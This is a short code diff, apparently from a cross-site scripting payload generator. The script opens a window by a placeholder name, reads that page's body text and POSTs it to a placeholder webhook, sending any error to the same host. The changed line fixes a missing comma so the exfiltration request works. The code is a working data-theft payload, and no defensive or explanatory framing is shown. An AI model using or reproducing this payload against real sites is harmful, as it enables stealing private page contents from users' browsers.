@@ -33,7 +33,7 @@ try {
 try {
   const profile = window.open("", "${OPEN}");
   let xhr = new XMLHttpRequest();
-  xhr.open("POST", "${WEBHOOK}" false);
+  xhr.open("POST", "${WEBHOOK}", false);
   xhr.send(profile.document.body.innerText);
 } catch (error) {
   get("${WEBHOOK}?" + error);
